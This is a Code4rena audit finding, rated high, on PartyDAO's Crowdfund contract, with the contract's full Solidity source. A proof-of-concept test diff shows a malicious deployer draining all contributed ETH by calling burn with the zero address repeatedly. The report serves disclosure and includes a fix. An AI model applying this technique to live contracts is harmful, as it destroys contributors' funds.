{
  "Title": "[H-02] Possibility to burn all ETH in Crowdfund under some circumstances",
  "Content": "# Lines of code\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L147\n\n\n# Vulnerability details\n\n## Impact\nIf `opts.initialContributor` is set to `address(0)` (and `opts.initialDelegate` is not), there are two problems:\n1.) If the crowdfund succeeds, the initial balance will be lost. It is still accredited to `address(0)`, but it is not retrievable. \n2.) If the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This will always succeed because `CrowdfundNFT._burn` can be called multiple times for `address(0)`. Every call will cause the initial balance to be burned (transferred to `address(0)`).\n\nIssue 1 is somewhat problematic, but issue 2 is very problematic, because all funds of a crowdfund are burned and an attacker can specifically set up such a deployment (and the user would not notice anything special, after all these are parameters that the protocol accepts).\n\n## Proof Of Concept\nThis diff illustrates scenario 2, i.e. where a malicious deployer burns all contributions (1 ETH) of `contributor`. He loses 0.25ETH for the attack, but this could be reduced significantly (with more `burn(payable(address(0)))` calls:\n\n```diff\n--- a/sol-tests/crowdfund/BuyCrowdfund.t.sol\n+++ b/sol-tests/crowdfund/BuyCrowdfund.t.sol\n@@ -36,9 +36,9 @@ contract BuyCrowdfundTest is Test, TestUtils {\n     string defaultSymbol = 'PBID';\n     uint40 defaultDuration = 60 * 60;\n     uint96 defaultMaxPrice = 10e18;\n-    address payable defaultSplitRecipient = payable(0);\n+    address payable defaultSplitRecipient = payable(address(this));\n     uint16 defaultSplitBps = 0.1e4;\n-    address defaultInitialDelegate;\n+    address defaultInitialDelegate = address(this);\n     IGateKeeper defaultGateKeeper;\n     bytes12 defaultGateKeeperId;\n     Crowdfund.FixedGovernanceOpts defaultGovernanceOpts;\n@@ -78,7 +78,7 @@ contract BuyCrowdfundTest is Test, TestUtils {\n                     maximumPrice: defaultMaxPrice,\n                     splitRecipient: defaultSplitRecipient,\n                     splitBps: defaultSplitBps,\n-                    initialContributor: address(this),\n+                    initialContributor: address(0),\n                     initialDelegate: defaultInitialDelegate,\n                     gateKeeper: defaultGateKeeper,\n                     gateKeeperId: defaultGateKeeperId,\n@@ -111,40 +111,26 @@ contract BuyCrowdfundTest is Test, TestUtils {\n     function testHappyPath() public {\n         uint256 tokenId = erc721Vault.mint();\n         // Create a BuyCrowdfund instance.\n-        BuyCrowdfund pb = _createCrowdfund(tokenId, 0);\n+        BuyCrowdfund pb = _createCrowdfund(tokenId, 0.25e18);\n         // Contribute and delegate.\n         address payable contributor = _randomAddress();\n         address delegate = _randomAddress();\n         vm.deal(contributor, 1e18);\n         vm.prank(contributor);\n         pb.contribute{ value: contributor.balance }(delegate, \"\");\n-        // Buy the token.\n-        vm.expectEmit(false, false, false, true);\n-        emit MockPartyFactoryCreateParty(\n-            address(pb),\n-            address(pb),\n-            _createExpectedPartyOptions(0.5e18),\n-            _toERC721Array(erc721Vault.token()),\n-            _toUint256Array(tokenId)\n-        );\n-        Party party_ = pb.buy(\n-            payable(address(erc721Vault)),\n-            0.5e18,\n-            abi.encodeCall(erc721Vault.claim, (tokenId)),\n-            defaultGovernanceOpts\n-        );\n-        assertEq(address(party), address(party_));\n-        // Burn contributor's NFT, mock minting governance tokens and returning\n-        // unused contribution.\n-        vm.expectEmit(false, false, false, true);\n-        emit MockMint(\n-            address(pb),\n-            contributor,\n-            0.5e18,\n-            delegate\n-        );\n-        pb.burn(contributor);\n-        assertEq(contributor.balance, 0.5e18);\n+        vm.warp(block.timestamp + defaultDuration + 1);\n+        // The auction was not won, we can now burn all ETH from contributor...\n+        assertEq(address(pb).balance, 1.25e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 1e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0.75e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0.5e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0.25e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0);\n```\n\n## Recommended Mitigation Steps\nDo not allow an initial contribution when `opts.initialContributor` is not set.",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-09-partydao-contest",
  "Code": [
    {
      "filename": "contracts/crowdfund/Crowdfund.sol",
      "content": "// SPDX-License-Identifier: Beta Software\npragma solidity ^0.8;\n\nimport \"../utils/LibAddress.sol\";\nimport \"../utils/LibRawResult.sol\";\nimport \"../utils/LibSafeCast.sol\";\nimport \"../tokens/ERC721Receiver.sol\";\nimport \"../party/Party.sol\";\nimport \"../globals/IGlobals.sol\";\nimport \"../gatekeepers/IGateKeeper.sol\";\n\nimport \"./CrowdfundNFT.sol\";\n\n// Base contract for AuctionCrowdfund/BuyCrowdfund.\n// Holds post-win/loss logic. E.g., burning contribution NFTs and creating a\n// party after winning.\nabstract contract Crowdfund is ERC721Receiver, CrowdfundNFT {\n    using LibRawResult for bytes;\n    using LibSafeCast for uint256;\n    using LibAddress for address payable;\n\n    enum CrowdfundLifecycle {\n        Invalid,\n        Active,\n        Expired,\n        Busy, // Temporary. mid-settlement state\n        Lost,\n        Won\n    }\n\n    // PartyGovernance options that must be known and fixed at crowdfund creation.\n    // This is a subset of PartyGovernance.GovernanceOpts.\n    struct FixedGovernanceOpts {\n        // Address of initial party hosts.\n        address[] hosts;\n        // How long people can vote on a proposal.\n        uint40 voteDuration;\n        // How long to wait after a proposal passes before it can be\n        // executed.\n        uint40 executionDelay;\n        // Minimum ratio of accept votes to consider a proposal passed,\n        // in bps, where 10,000 == 100%.\n        uint16 passThresholdBps;\n        // Fee bps for governance distributions.\n        uint16 feeBps;\n        // Fee recipeint for governance distributions.\n        address payable feeRecipient;\n    }\n\n    // Options to be passed into `_initialize()` when the crowdfund is created.\n    struct CrowdfundOptions {\n        string name;\n        string symbol;\n        address payable splitRecipient;\n        uint16 splitBps;\n        address initialContributor;\n        address initialDelegate;\n        IGateKeeper gateKeeper;\n        bytes12 gateKeeperId;\n        FixedGovernanceOpts governanceOpts;\n    }\n\n    // A record of a single contribution made by a user.\n    // Stored in `_contributionsByContributor`.\n    struct Contribution {\n        // The value of `Crowdfund.totalContributions` when this contribution was made.\n        uint96 previousTotalContributions;\n        // How much was this contribution.\n        uint96 amount;\n    }\n\n    error PartyAlreadyExistsError(Party party);\n    error WrongLifecycleError(CrowdfundLifecycle lc);\n    error InvalidGovernanceOptionsError(bytes32 actualHash, bytes32 expectedHash);\n    error InvalidDelegateError();\n    error NoPartyError();\n    error OnlyContributorAllowedError();\n    error NotAllowedByGateKeeperError(address contributor, IGateKeeper gateKeeper, bytes12 gateKeeperId, bytes gateData);\n    error SplitRecipientAlreadyBurnedError();\n    error InvalidBpsError(uint16 bps);\n\n    event Burned(address contributor, uint256 ethUsed, uint256 ethOwed, uint256 votingPower);\n    event Contributed(address contributor, uint256 amount, address delegate, uint256 previousTotalContributions);\n\n    // The `Globals` contract storing global configuration values. This contract\n    // is immutable and itâ€™s address will never change.\n    IGlobals private immutable _GLOBALS;\n\n    /// @notice The party instance created by `_createParty()`, if any after a\n    ///         successful crowdfund.\n    Party public party;\n    /// @notice The total (recorded) ETH contributed to this crowdfund.\n    uint96 public totalContributions;\n    /// @notice The gatekeeper contract to use (if non-null) to restrict who can\n    ///         contribute to the party.\n    IGateKeeper public gateKeeper;\n    /// @notice The ID of the gatekeeper strategy to use.\n    bytes12 public gateKeeperId;\n    /// @notice Who will receive a reserved portion of governance power when\n    ///         the governance party is created.\n    address payable public splitRecipient;\n    /// @notice How much governance power to reserve for `splitRecipient`,\n    ///         in bps, where 10,000 = 100%.\n    uint16 public splitBps;\n    // Whether the share for split recipient has been claimed through `burn()`.\n    bool private _splitRecipientHasBurned;\n    /// @notice Hash of party governance options passed into `initialize()`.\n    ///         Used to check whether the `GovernanceOpts` passed into\n    ///         `_createParty()` matches.\n    bytes32 public governanceOptsHash;\n    /// @notice Who a contributor last delegated to.\n    mapping(address => address) public delegationsByContributor;\n    // Array of contributions by a contributor.\n    // One is created for every nonzero contribution made.\n    mapping (address => Contribution[]) private _contributionsByContributor;\n\n    // Set the `Globals` contract.\n    constructor(IGlobals globals) CrowdfundNFT(globals) {\n        _GLOBALS = globals;\n    }\n\n    // Initialize storage for proxy contracts, credit initial contribution (if\n    // any), and setup gatekeeper.\n    function _initialize(CrowdfundOptions memory opts)\n        internal\n    {\n        CrowdfundNFT._initialize(opts.name, opts.symbol);\n        // Check that BPS values do not exceed the max.\n        if (opts.governanceOpts.feeBps > 1e4) {\n            revert InvalidBpsError(opts.governanceOpts.feeBps);\n        }\n        if (opts.governanceOpts.passThresholdBps > 1e4) {\n            revert InvalidBpsError(opts.governanceOpts.passThresholdBps);\n        }\n        if (opts.splitBps > 1e4) {\n            revert InvalidBpsError(opts.splitBps);\n        }\n        governanceOptsHash = _hashFixedGovernanceOpts(opts.governanceOpts);\n        splitRecipient = opts.splitRecipient;\n        splitBps = opts.splitBps;\n        // If the deployer passed in some ETH during deployment, credit them\n        // for the initial contribution.\n        uint96 initialBalance = address(this).balance.safeCastUint256ToUint96();\n        if (initialBalance > 0) {\n            // If this contract has ETH, either passed in during deployment or\n            // pre-existing, credit it to the `initialContributor`.\n            _contribute(opts.initialContributor, initialBalance, opts.initialDelegate, 0, \"\");\n        }\n        // Set up gatekeeper after initial contribution (initial always gets in).\n        gateKeeper = opts.gateKeeper;\n        gateKeeperId = opts.gateKeeperId;\n    }\n\n    /// @notice Burn the participation NFT for `contributor`, potentially\n    ///         minting voting power and/or refunding unused ETH. `contributor`\n    ///         may also be the split recipient, regardless of whether they are\n    ///         also a contributor or not. This can be called by anyone on a\n    ///         contributor's behalf to unlock their voting power in the\n    ///         governance stage ensuring delegates receive their voting\n    ///         power and governance is not stalled.\n    /// @dev If the party has won, someone needs to call `_createParty()` first. After\n    ///      which, `burn()` will refund unused ETH and mint governance tokens for the\n    ///      given `contributor`.\n    ///      If the party has lost, this will only refund unused ETH (all of it) for\n    ///      the given `contributor`.\n    /// @param contributor The contributor whose NFT to burn for.\n    function burn(address payable contributor)\n        public\n    {\n        return _burn(contributor, getCrowdfundLifecycle(), party);\n    }\n\n    /// @notice `burn()` in batch form.\n    /// @param contributors The contributors whose NFT to burn for.\n    function batchBurn(address payable[] calldata contributors)\n        external\n    {\n        Party party_ = party;\n        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n        for (uint256 i = 0; i < contributors.length; ++i) {\n            _burn(contributors[i], lc, party_);\n        }\n    }\n\n    /// @notice Contribute to this crowdfund and/or update your delegation for the\n    ///         governance phase should the crowdfund succeed.\n    ///         For restricted crowdfunds, `gateData` can be provided to prove\n    ///         membership to the gatekeeper.\n    /// @param delegate The address to delegate to for the governance phase.\n    /// @param gateData Data to pass to the gatekeeper to prove eligibility.\n    function contribute(address delegate, bytes memory gateData)\n        public\n        payable\n    {\n        _contribute(\n            msg.sender,\n            msg.value.safeCastUint256ToUint96(),\n            delegate,\n            // We cannot use `address(this).balance - msg.value` as the previous\n            // total contributions in case someone forces (suicides) ETH into this\n            // contract. This wouldn't be such a big deal for open crowdfunds\n            // but private ones (protected by a gatekeeper) could be griefed\n            // because it would ultimately result in governance power that\n            // is unattributed/unclaimable, meaning that party will never be\n            // able to reach 100% consensus.\n            totalContributions,\n            gateData\n        );\n    }\n\n    /// @inheritdoc EIP165\n    function supportsInterface(bytes4 interfaceId)\n        public\n        override(ERC721Receiver, CrowdfundNFT)\n        pure\n        returns (bool)\n    {\n        return ERC721Receiver.supportsInterface(interfaceId) ||\n            CrowdfundNFT.supportsInterface(interfaceId);\n    }\n\n    /// @notice Retrieve info about a participant's contributions.\n    /// @dev This will only be called off-chain so doesn't have to be optimal.\n    /// @param contributor The contributor to retrieve contributions for.\n    /// @return ethContributed The total ETH contributed by `contributor`.\n    /// @return ethUsed The total ETH used by `contributor` to acquire the NFT.\n    /// @return ethOwed The total ETH refunded back to `contributor`.\n    /// @return votingPower The total voting power minted to `contributor`.\n    function getContributorInfo(address contributor)\n        external\n        view\n        returns (\n            uint256 ethContributed,\n            uint256 ethUsed,\n            uint256 ethOwed,\n            uint256 votingPower\n        )\n    {\n        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n        Contribution[] storage contributions = _contributionsByContributor[contributor];\n        uint256 numContributions = contributions.length;\n        for (uint256 i = 0; i < numContributions; ++i) {\n            ethContributed += contributions[i].amount;\n        }\n        if (lc == CrowdfundLifecycle.Won || lc == CrowdfundLifecycle.Lost) {\n            (ethUsed, ethOwed, votingPower) = _getFinalContribution(contributor);\n        }\n    }\n\n    /// @notice Get the current lifecycle of the crowdfund.\n    function getCrowdfundLifecycle() public virtual view returns (CrowdfundLifecycle);\n\n    // Get the final sale price of the bought assets. This will also be the total\n    // voting power of the governance party.\n    function _getFinalPrice() internal virtual view returns (uint256);\n\n    // Can be called after a party has won.\n    // Deploys and initializes a a `Party` instance via the `PartyFactory`\n    // and transfers the bought NFT to it.\n    // After calling this, anyone can burn CF tokens on a contributor's behalf\n    // with the `burn()` function.\n    function _createParty(\n        IPartyFactory partyFactory,\n        FixedGovernanceOpts memory governanceOpts,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds\n    )\n        internal\n        returns (Party party_)\n    {\n        if (party != Party(payable(0))) {\n            revert PartyAlreadyExistsError(party);\n        }\n        {\n            bytes16 governanceOptsHash_ = _hashFixedGovernanceOpts(governanceOpts);\n            if (governanceOptsHash_ != governanceOptsHash) {\n                revert InvalidGovernanceOptionsError(governanceOptsHash_, governanceOptsHash);\n            }\n        }\n        party = party_ = partyFactory\n            .createParty(\n                address(this),\n                Party.PartyOptions({\n                    name: name,\n                    symbol: symbol,\n                    governance: PartyGovernance.GovernanceOpts({\n                        hosts: governanceOpts.hosts,\n                        voteDuration: governanceOpts.voteDuration,\n                        executionDelay: governanceOpts.executionDelay,\n                        passThresholdBps: governanceOpts.passThresholdBps,\n                        totalVotingPower: _getFinalPrice().safeCastUint256ToUint96(),\n                        feeBps: governanceOpts.feeBps,\n                        feeRecipient: governanceOpts.feeRecipient\n                    })\n                }),\n                preciousTokens,\n                preciousTokenIds\n            );\n        // Transfer the acquired NFTs to the new party.\n        for (uint256 i = 0; i < preciousTokens.length; ++i) {\n            preciousTokens[i].transferFrom(address(this), address(party_), preciousTokenIds[i]);\n        }\n    }\n\n    // Overloaded single token wrapper for _createParty()\n    function _createParty(\n        IPartyFactory partyFactory,\n        FixedGovernanceOpts memory governanceOpts,\n        IERC721 preciousToken,\n        uint256 preciousTokenId\n    )\n        internal\n        returns (Party party_)\n    {\n        IERC721[] memory tokens = new IERC721[](1);\n        tokens[0] = preciousToken;\n        uint256[] memory tokenIds = new uint256[](1);\n        tokenIds[0] = preciousTokenId;\n        return _createParty(partyFactory, governanceOpts, tokens, tokenIds);\n    }\n\n    function _hashFixedGovernanceOpts(FixedGovernanceOpts memory opts)\n        internal\n        pure\n        returns (bytes16 h)\n    {\n        // Hash in place.\n        assembly {\n            // Replace the address[] hosts field with its hash temporarily.\n            let oldHostsFieldValue := mload(opts)\n            mstore(opts, keccak256(add(mload(opts), 0x20), mul(mload(mload(opts)), 32)))\n            // Hash the entire struct.\n            h := keccak256(opts, 0xC0)\n            // Restore old hosts field value.\n            mstore(opts, oldHostsFieldValue)\n        }\n    }\n\n    function _getFinalContribution(address contributor)\n        internal\n        view\n        returns (uint256 ethUsed, uint256 ethOwed, uint256 votingPower)\n    {\n        uint256 totalEthUsed = _getFinalPrice();\n        {\n            Contribution[] storage contributions = _contributionsByContributor[contributor];\n            uint256 numContributions = contributions.length;\n            for (uint256 i = 0; i < numContributions; ++i) {\n                Contribution memory c = contributions[i];\n                if (c.previousTotalContributions >= totalEthUsed) {\n                    // This entire contribution was not used.\n                    ethOwed += c.amount;\n                } else if (c.previousTotalContributions + c.amount <= totalEthUsed) {\n                    // This entire contribution was used.\n                    ethUsed += c.amount;\n                } else {\n                    // This contribution was partially used.\n                    uint256 partialEthUsed = totalEthUsed - c.previousTotalContributions;\n                    ethUsed += partialEthUsed;\n                    ethOwed = c.amount - partialEthUsed;\n                }\n            }\n        }\n        // one SLOAD with optimizer on\n        address splitRecipient_ = splitRecipient;\n        uint256 splitBps_ = splitBps;\n        if (splitRecipient_ == address(0)) {\n            splitBps_ = 0;\n        }\n        votingPower = ((1e4 - splitBps_) * ethUsed) / 1e4;\n        if (splitRecipient_ == contributor) {\n            // Split recipient is also the contributor so just add the split\n            // voting power.\n            votingPower += (splitBps_ * totalEthUsed + (1e4 - 1)) / 1e4; // round up\n        }\n    }\n\n    function _contribute(\n        address contributor,\n        uint96 amount,\n        address delegate,\n        uint96 previousTotalContributions,\n        bytes memory gateData\n    )\n        internal\n    {\n        // Require a non-null delegate.\n        if (delegate == address(0)) {\n            revert InvalidDelegateError();\n        }\n        // Must not be blocked by gatekeeper.\n        if (gateKeeper != IGateKeeper(address(0))) {\n            if (!gateKeeper.isAllowed(contributor, gateKeeperId, gateData)) {\n                revert NotAllowedByGateKeeperError(\n                    contributor,\n                    gateKeeper,\n                    gateKeeperId,\n                    gateData\n                );\n            }\n        }\n\n        // Update delegate.\n        // OK if this happens out of cycle.\n        delegationsByContributor[contributor] = delegate;\n        emit Contributed(contributor, amount, delegate, previousTotalContributions);\n\n        // OK to contribute with zero just to update delegate.\n        if (amount != 0) {\n            // Increase total contributions.\n            totalContributions += amount;\n\n            // Only allow contributions while the crowdfund is active.\n            {\n                CrowdfundLifecycle lc = getCrowdfundLifecycle();\n                if (lc != CrowdfundLifecycle.Active) {\n                    revert WrongLifecycleError(lc);\n                }\n            }\n            // Create contributions entry for this contributor.\n            Contribution[] storage contributions = _contributionsByContributor[contributor];\n            uint256 numContributions = contributions.length;\n            if (numContributions >= 1) {\n                Contribution memory lastContribution = contributions[numContributions - 1];\n                if (lastContribution.previousTotalContributions == previousTotalContributions) {\n                    // No one else has contributed since so just reuse the last entry.\n                    lastContribution.amount += amount;\n                    contributions[numContributions - 1] = lastContribution;\n                    return;\n                }\n            }\n            // Add a new contribution entry.\n            contributions.push(Contribution({\n                previousTotalContributions: previousTotalContributions,\n                amount: amount\n            }));\n            // Mint a participation NFT if this is their first contribution.\n            if (numContributions == 0) {\n                _mint(contributor);\n            }\n        }\n    }\n\n    function _burn(address payable contributor, CrowdfundLifecycle lc, Party party_)\n        private\n    {\n        // If the CF has won, a party must have been created prior.\n        if (lc == CrowdfundLifecycle.Won) {\n            if (party_ == Party(payable(0))) {\n                revert NoPartyError();\n            }\n        } else if (lc != CrowdfundLifecycle.Lost) {\n            // Otherwise it must have lost.\n            revert WrongLifecycleError(lc);\n        }\n        // Split recipient can burn even if they don't have a token.\n        if (contributor == splitRecipient) {\n            if (_splitRecipientHasBurned) {\n                revert SplitRecipientAlreadyBurnedError();\n            }\n            _splitRecipientHasBurned = true;\n        }\n        // Revert if already burned or does not exist.\n        if (splitRecipient != contributor || _doesTokenExistFor(contributor)) {\n            CrowdfundNFT._burn(contributor);\n        }\n        // Compute the contributions used and owed to the contributor, along\n        // with the voting power they'll have in the governance stage.\n        (uint256 ethUsed, uint256 ethOwed, uint256 votingPower) =\n            _getFinalContribution(contributor);\n        if (votingPower > 0) {\n            // Get the address to delegate voting power to. If null, delegate to self.\n            address delegate = delegationsByContributor[contributor];\n            if (delegate == address(0)) {\n                // Delegate can be unset for the split recipient if they never\n                // contribute. Self-delegate if this occurs.\n                delegate = contributor;\n            }\n            // Mint governance NFT for the contributor.\n            party_.mint(\n                contributor,\n                votingPower,\n                delegate\n            );\n        }\n        // Refund any ETH owed back to the contributor.\n        contributor.transferEth(ethOwed);\n        emit Burned(contributor, ethUsed, ethOwed, votingPower);\n    }\n\n    function _getPartyFactory() internal view returns (IPartyFactory) {\n        return IPartyFactory(_GLOBALS.getAddress(LibGlobals.GLOBAL_PARTY_FACTORY));\n    }\n}"
    }
  ]
}